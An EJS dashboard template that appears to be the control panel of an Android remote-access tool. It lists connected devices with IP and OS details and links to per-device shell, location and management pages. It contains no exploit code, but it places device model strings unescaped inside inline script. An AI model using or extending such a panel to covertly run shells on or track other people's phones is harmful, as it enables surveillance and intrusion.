<!DOCTYPE html>
<html class="dark">
<% include partials/head.ejs %>
<body class="bg-bg-dark min-h-screen">
    <% include partials/header-new.ejs %>
    <% include partials/sidebar-new.ejs %>

    <!-- Main content -->
    <div class="ml-56 mt-14 p-6 space-y-6">
        <!-- Page title -->
        <div class="flex items-center justify-between">
            <h1 class="text-2xl font-bold text-white">Dashboard</h1>
            <div class="flex items-center gap-3">
                <button class="btn-ghost text-sm" onclick="window.location.reload()">
                    <svg class="w-4 h-4 inline mr-1" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 4v5h.582m15.356 2A8.001 8.001 0 004.582 9m0 0H9m11 11v-5h-.581m0 0a8.003 8.003 0 01-15.357-2m15.357 2H15"/></svg>
                    Refresh
                </button>
            </div>
        </div>

        <!-- Stats cards row -->
        <div class="grid grid-cols-4 gap-4">
            <!-- Online Devices -->
            <div class="glass rounded-xl p-5 glow-green">
                <div class="flex items-center justify-between mb-3">
                    <span class="text-slate-400 text-sm font-medium">Online Devices</span>
                    <span class="status-online"></span>
                </div>
                <div class="text-4xl font-bold text-white"><%= clientsOnline.length %></div>
            </div>
            <!-- Total Devices -->
            <div class="glass rounded-xl p-5 glow-blue">
                <div class="flex items-center justify-between mb-3">
                    <span class="text-slate-400 text-sm font-medium">Total Devices</span>
                    <svg class="w-5 h-5 text-accent-blue" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 18h.01M8 21h8a2 2 0 002-2V5a2 2 0 00-2-2H8a2 2 0 00-2 2v14a2 2 0 002 2z"/></svg>
                </div>
                <div class="text-4xl font-bold text-white"><%= clientsOnline.length + clientsOffline.length %></div>
            </div>
            <!-- CPU -->
            <div class="glass rounded-xl p-5 gradient-amber glow-amber">
                <div class="flex items-center justify-between mb-3">
                    <span class="text-slate-400 text-sm font-medium">Alpine</span>
                    <svg class="w-5 h-5 text-accent-amber" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 7v10c0 2.21 3.582 4 8 4s8-1.79 8-4V7M4 7c0 2.21 3.582 4 8 4s8-1.79 8-4M4 7c0-2.21 3.582-4 8-4s8 1.79 8 4"/></svg>
                </div>
                <div class="text-4xl font-bold text-white">Active</div>
            </div>
            <!-- Shell -->
            <div class="glass rounded-xl p-5 gradient-green">
                <div class="flex items-center justify-between mb-3">
                    <span class="text-slate-400 text-sm font-medium">Commands</span>
                    <svg class="w-5 h-5 text-accent-green" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 9l3 3-3 3m5 0h3M5 20h14a2 2 0 002-2V6a2 2 0 00-2-2H5a2 2 0 00-2 2v12a2 2 0 002 2z"/></svg>
                </div>
                <div class="text-4xl font-bold text-white">Live</div>
            </div>
        </div>

        <!-- Latest Activity + Global Map -->
        <div class="grid grid-cols-3 gap-4">
            <!-- Latest Activity -->
            <div class="col-span-1 glass rounded-xl p-4">
                <div class="flex items-center justify-between mb-4">
                    <h3 class="text-white font-semibold text-sm">Latest Activity</h3>
                    <span class="text-slate-500 text-xs px-2 py-1 rounded bg-slate-800/50 cursor-pointer hover:bg-slate-700/50">All Activity</span>
                </div>
                <div class="space-y-3 max-h-72 overflow-y-auto pr-2">
                    <% if (clientsOnline.length > 0) { %>
                        <% clientsOnline.forEach(function(c) { %>
                        <div class="flex items-start gap-3 text-sm">
                            <div class="feed-dot bg-accent-green glow-green mt-1.5 flex-shrink-0"></div>
                            <div>
                                <p class="text-slate-300">Device <span class="text-white font-medium">[<%= c.dynamicData.device.model || 'Unknown' %>]</span> connected</p>
                                <p class="text-slate-600 text-xs"><%= c.dynamicData.clientIP %></p>
                            </div>
                        </div>
                        <% }); %>
                    <% } %>
                    <% if (clientsOffline.length > 0) { %>
                        <% clientsOffline.slice(0, 3).forEach(function(c) { %>
                        <div class="flex items-start gap-3 text-sm">
                            <div class="feed-dot bg-slate-600 mt-1.5 flex-shrink-0"></div>
                            <div>
                                <p class="text-slate-400">Device <span class="text-slate-300 font-medium">[<%= c.dynamicData.device.model || 'Unknown' %>]</span> disconnected</p>
                                <p class="text-slate-600 text-xs"><%= new Date(c.lastSeen).toLocaleString('en-GB', {timeZone:'UTC'}) %></p>
                            </div>
                        </div>
                        <% }); %>
                    <% } %>
                    <% if (clientsOnline.length === 0 && clientsOffline.length === 0) { %>
                        <p class="text-slate-600 text-sm text-center py-8">No devices connected yet.</p>
                    <% } %>
                </div>
            </div>

            <!-- Global Map placeholder -->
            <div class="col-span-2 glass rounded-xl p-4">
                <h3 class="text-white font-semibold text-sm mb-4">Global Map</h3>
                <div class="bg-slate-800/50 rounded-lg h-72 flex items-center justify-center overflow-hidden relative">
                    <svg class="w-full h-full text-slate-700/30" viewBox="0 0 1000 500" fill="currentColor">
                        <!-- Simple world map silhouette -->
                        <ellipse cx="500" cy="250" rx="450" ry="200" fill="none" stroke="currentColor" stroke-width="0.5"/>
                        <circle cx="200" cy="180" r="80" opacity="0.15"/>
                        <circle cx="350" cy="150" r="60" opacity="0.15"/>
                        <circle cx="520" cy="200" r="120" opacity="0.15"/>
                        <circle cx="700" cy="170" r="90" opacity="0.15"/>
                        <circle cx="800" cy="300" r="60" opacity="0.15"/>
                    </svg>
                    <% if (clientsOnline.length > 0) { %>
                    <% clientsOnline.forEach(function(c, i) { %>
                    <div class="absolute w-3 h-3 bg-accent-green rounded-full glow-green animate-pulse" 
                         style="left: <%= 20 + i * 25 %>%; top: <%= 30 + i * 15 %>%; animation-delay: <%= i * 0.5 %>s;" 
                         title="<%= c.dynamicData.device.model || 'Device' %>"></div>
                    <% }); %>
                    <% } %>
                    <% if (clientsOnline.length === 0) { %>
                    <p class="text-slate-500 text-sm z-10">No online devices to map</p>
                    <% } %>
                </div>
            </div>
        </div>

        <!-- Online Devices Table -->
        <div class="glass rounded-xl p-4">
            <div class="flex items-center justify-between mb-4">
                <h3 class="text-white font-semibold text-sm">Online Devices</h3>
                <div class="flex items-center gap-2">
                    <span class="text-slate-500 text-xs">Quick Actions</span>
                    <svg class="w-4 h-4 text-slate-500" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 9l-7 7-7-7"/></svg>
                </div>
            </div>
            <% if (clientsOnline.length > 0) { %>
            <table class="w-full text-sm">
                <thead>
                    <tr class="text-slate-500 text-left border-b border-slate-700/50">
                        <th class="pb-3 font-medium">Status</th>
                        <th class="pb-3 font-medium">Device Name</th>
                        <th class="pb-3 font-medium">IP Address</th>
                        <th class="pb-3 font-medium">OS Version</th>
                        <th class="pb-3 font-medium">Last Seen</th>
                        <th class="pb-3 font-medium">Actions</th>
                    </tr>
                </thead>
                <tbody>
                    <% clientsOnline.forEach(function(c) { 
                        let dd = c.dynamicData || {};
                        let dev = dd.device || {};
                    %>
                    <tr class="table-row border-b border-slate-700/30">
                        <td class="py-3"><span class="status-online"></span> <span class="text-accent-green ml-2">Online</span></td>
                        <td class="py-3 text-white font-medium"><%= dev.model || 'Unknown' %></td>
                        <td class="py-3 text-slate-400 font-mono text-xs"><%= dd.clientIP %></td>
                        <td class="py-3 text-slate-400"><%= dev.release %> (SDK <%= dev.sdk %>)</td>
                        <td class="py-3 text-slate-500 text-xs"><%= new Date(c.lastSeen).toLocaleString('en-GB', {timeZone:'UTC'}) %></td>
                        <td class="py-3">
                            <div class="flex items-center gap-2">
                                <a href="/manage/<%= c.clientID %>/info" class="btn-ghost text-xs px-2 py-1" title="Manage"><svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12h6m-6 4h6m2 5H7a2 2 0 01-2-2V5a2 2 0 012-2h5.586a1 1 0 01.707.293l5.414 5.414a1 1 0 01.293.707V19a2 2 0 01-2 2z"/></svg></a>
                                <a href="/manage/<%= c.clientID %>/terminal" class="btn-ghost text-xs px-2 py-1" title="Shell"><svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 9l3 3-3 3m5 0h3M5 20h14a2 2 0 002-2V6a2 2 0 00-2-2H5a2 2 0 00-2 2v12a2 2 0 002 2z"/></svg></a>
                                <a href="/manage/<%= c.clientID %>/location" class="btn-ghost text-xs px-2 py-1" title="Location"><svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M17.657 16.657L13.414 20.9a1.998 1.998 0 01-2.827 0l-4.244-4.243a8 8 0 1111.314 0z"/></svg></a>
                                <button class="btn-danger text-xs px-2 py-1 deleteDevice" data-client="<%= c.clientID %>" title="Delete"><svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 7l-.867 12.142A2 2 0 0116.138 21H7.862a2 2 0 01-1.995-1.858L5 7m5 4v6m4-6v6m1-10V4a1 1 0 00-1-1h-4a1 1 0 00-1 1v3M4 7h16"/></svg></button>
                            </div>
                        </td>
                    </tr>
                    <% }); %>
                </tbody>
            </table>
            <% } else { %>
            <div class="text-center py-12">
                <svg class="w-12 h-12 text-slate-700 mx-auto mb-3" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5" d="M12 18h.01M8 21h8a2 2 0 002-2V5a2 2 0 00-2-2H8a2 2 0 00-2 2v14a2 2 0 002 2z"/></svg>
                <p class="text-slate-500">No online devices</p>
            </div>
            <% } %>
        </div>

        <!-- Offline Devices (collapsed) -->
        <% if (clientsOffline.length > 0) { %>
        <div class="glass rounded-xl p-4">
            <details>
                <summary class="text-slate-400 font-semibold text-sm cursor-pointer hover:text-white transition-colors">
                    Offline Devices (<%= clientsOffline.length %>)
                </summary>
                <div class="mt-4">
                    <table class="w-full text-sm">
                        <thead>
                            <tr class="text-slate-500 text-left border-b border-slate-700/50">
                                <th class="pb-3 font-medium">Status</th>
                                <th class="pb-3 font-medium">Device Name</th>
                                <th class="pb-3 font-medium">IP Address</th>
                                <th class="pb-3 font-medium">Last Seen</th>
                                <th class="pb-3 font-medium">Actions</th>
                            </tr>
                        </thead>
                        <tbody>
                            <% clientsOffline.forEach(function(c) { 
                                let dd = c.dynamicData || {};
                                let dev = dd.device || {};
                            %>
                            <tr class="table-row border-b border-slate-700/30">
                                <td class="py-3"><span class="status-offline"></span> <span class="text-slate-500 ml-2">Offline</span></td>
                                <td class="py-3 text-slate-300 font-medium"><%= dev.model || 'Unknown' %></td>
                                <td class="py-3 text-slate-500 font-mono text-xs"><%= dd.clientIP %></td>
                                <td class="py-3 text-slate-600 text-xs"><%= new Date(c.lastSeen).toLocaleString('en-GB', {timeZone:'UTC'}) %></td>
                                <td class="py-3">
                                    <button class="btn-danger text-xs px-2 py-1 deleteDevice" data-client="<%= c.clientID %>">Delete</button>
                                </td>
                            </tr>
                            <% }); %>
                        </tbody>
                    </table>
                </div>
            </details>
        </div>
        <% } %>
    </div>

    <!-- Toast container -->
    <div id="toast-container" class="fixed top-16 right-6 z-[9999] space-y-2 w-72"></div>

    <% include partials/aiPanel.ejs %>

    <script>
        $(document).ready(function() {
            // Auto-refresh device list
            setInterval(function() { window.location.reload(); }, 15000);

            // Delete device
            $('.deleteDevice').click(function() {
                var id = $(this).data('client');
                if (confirm('Delete device ' + id + '?')) {
                    $.post('/manage/' + id + '/delete', function(d) {
                        if (d.error) showNotification('#f03434', d.error);
                        else { showNotification('#2ecc71', d.message); setTimeout(function(){ window.location.reload(); }, 500); }
                    });
                }
            });

            // Toast notifications
            function showToast(icon, text) {
                var html = '<div class="toast-item glass-bright rounded-lg p-3 flex items-center gap-3 shadow-lg"><span class="status-online"></span><div><p class="text-white text-sm font-medium">' + text + '</p></div></div>';
                $('#toast-container').append(html);
                setTimeout(function() { $('#toast-container .toast-item').first().remove(); }, 5000);
            }

            // Show toasts for online devices
            <% clientsOnline.forEach(function(c) { %>
            showToast('<%= c.dynamicData.device.model %>', 'New <%= c.dynamicData.device.model %> connected');
            <% }); %>
        });
    </script>
</body>
</html>
